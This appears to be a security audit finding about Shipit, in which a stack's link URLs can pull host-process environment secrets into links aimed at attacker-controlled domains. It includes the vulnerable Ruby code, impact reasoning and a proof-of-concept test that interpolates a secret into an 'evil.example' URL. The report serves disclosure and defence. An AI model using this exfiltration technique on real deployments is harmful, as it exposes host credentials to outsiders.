### Title
`EnvironmentVariables#interpolate` falls back to the Shipit host process `ENV`, letting a stack's own env config exfiltrate host secrets via rendered links - (File: lib/shipit/environment_variables.rb)

### Summary
`Stack#links` interpolates each configured link URL using `EnvironmentVariables.with(stack.env)`, but `#interpolate` (unlike `#permit`) takes no whitelist and resolves any `$WORD` not present in the stack's own env hash by falling back to `ENV[variable]` — the Shipit process's real environment. A stack owner who controls their repository's declared env/link config can therefore embed `$SOME_HOST_SECRET_VAR` in a link URL, and if that variable happens to be set in the Shipit host's process environment (common for secrets like API keys, `SECRET_KEY_BASE`, cloud credentials, etc., which are frequently exposed via `ENV` in Rails deployments), the interpolated value is rendered as a clickable `<a>` link to any viewer of the stack page.

### Finding Description
The claimed binding: values substituted into a stack's rendered links == only values from that stack's own declared `env`, never the Shipit process's `ENV`. This binding is broken.

`EnvironmentVariables#interpolate` is implemented as: [1](#0-0) 

```ruby
def interpolate(argument)
  return argument unless @env

  argument.gsub(/(\$\w+)/) do |variable|
    variable.sub!('$', '')
    Shellwords.escape(@env.fetch(variable) { ENV[variable] })
  end
end
```

Note `@env.fetch(variable) { ENV[variable] }` — if the key is absent from the instance's own `@env` (the stack's declared env), the block falls back to the top-level `ENV`, which is the Shipit host process's environment, not scoped to the repository/stack at all. This is distinct from `#permit`, which explicitly requires and enforces a whitelist (`variable_definitions`) and raises `NotPermitted` for anything not on it: [2](#0-1) 

`#interpolate` has no such whitelist — it is called directly with `EnvironmentVariables.with(env)` where `env` is the stack's arbitrary, operator/config-declared env hash, and any variable name not defined there silently resolves to the real process `ENV`.

The rendered result is displayed unescaped as a link target in the stack header partial: [3](#0-2) 

```erb
<% stack.links.each do |name, url| %>
  <li class="nav__list__sub__item">
    <%= link_to name.humanize, url, :target => '_blank', :class => "#{name.dasherize}-url" %>
  </li>
<% end %>
```

This page is visible to any viewer with read access to the stack (no special privilege required beyond normal stack viewing), and the `<a>` tag will cause any browser (or scanner/preview bot) to send an outbound request to the attacker-controlled domain with the secret embedded in the URL path/query, which will appear in that attacker's own HTTP access logs — a classic exfiltration-via-egress pattern.

None of the existing guards prevent this: `EnvironmentVariables#permit` is not used on this code path at all (only `#interpolate` is), `Repository`/`Stack` validators constrain format of names/branches but not arbitrary env values or URL interpolation results, and there is no whitelist enforced before `ENV[variable]` fallback occurs.

### Impact Explanation
An unprivileged actor who can influence a stack's declared `links` configuration (via their own repository's `Shipit.yml`/deploy spec, which is under attacker control for their own repo) can name any environment variable. If that variable happens to be present in the Shipit host's process `ENV` (e.g., `AWS_SECRET_ACCESS_KEY`, `DATABASE_URL`, `SECRET_KEY_BASE`, GitHub App keys stored as env vars, etc. — deployment-dependent but a very common practice), its value is interpolated into a publicly-clickable link. Any legitimate viewer of the stack page, or any automated link-preview/crawler bot, triggers the outbound request, exfiltrating the secret value to a URL the attacker fully controls and can read logs from. This is a credential-exfiltration primitive matching the "Critical - exfiltration of ... deploy-time secrets" category, scoped to whatever secrets are present in the Shipit host process `ENV` (blast radius depends on host configuration, but is host-wide, not limited to the attacker's own stack).

### Likelihood Explanation
Preconditions: (1) the attacker must control (or have write access to) a repository configured as a Shipit stack, enough to set a `links` entry containing `$VARNAME` in its deploy spec/config — this is exactly the kind of config an unprivileged repo owner has full control over; (2) the named environment variable must actually be set in the Shipit host process `ENV` — this is deployment-specific and not guaranteed, but many Rails/Shipit deployments do pass secrets via process env (e.g. for Rails credentials, cloud SDKs, etc.), making this a realistic risk in a non-trivial number of deployments. Attacker cost is minimal (edit their own config, wait for a viewer or bot to click/prefetch the link) and the attack is fully repeatable for any variable name they choose to probe.

### Recommendation
Remove the `ENV[variable]` fallback from `EnvironmentVariables#interpolate`, or require interpolation to go through the same whitelist mechanism used by `#permit` so only variables explicitly declared/allowed for that stack can be substituted. At minimum, when a variable is not present in `@env`, it should resolve to an empty string or raise, never fall back to the Shipit process's own `ENV`.

### Proof of Concept
```ruby
# test/unit/environment_variables_test.rb (extend existing test file)
test "#interpolate does not leak process ENV for undeclared variables" do
  ENV['SHIPIT_TEST_SECRET'] = 'super-secret-value'
  env = EnvironmentVariables.with({}) # stack's own env does NOT contain SHIPIT_TEST_SECRET
  result = env.interpolate('http://evil.example/$SHIPIT_TEST_SECRET')
  refute_includes result, 'super-secret-value'
ensure
  ENV.delete('SHIPIT_TEST_SECRET')
end
```
Binding under test: `EnvironmentVariables#interpolate(url)` output should only ever draw from the stack's own `env` hash (`{}` here, i.e. not containing `SHIPIT_TEST_SECRET`) and never from `ENV['SHIPIT_TEST_SECRET']`. As implemented at [1](#0-0)  this test fails, confirming the fallback leaks the process `ENV` value into the interpolated (and, via `Stack#links`, publicly rendered) URL.
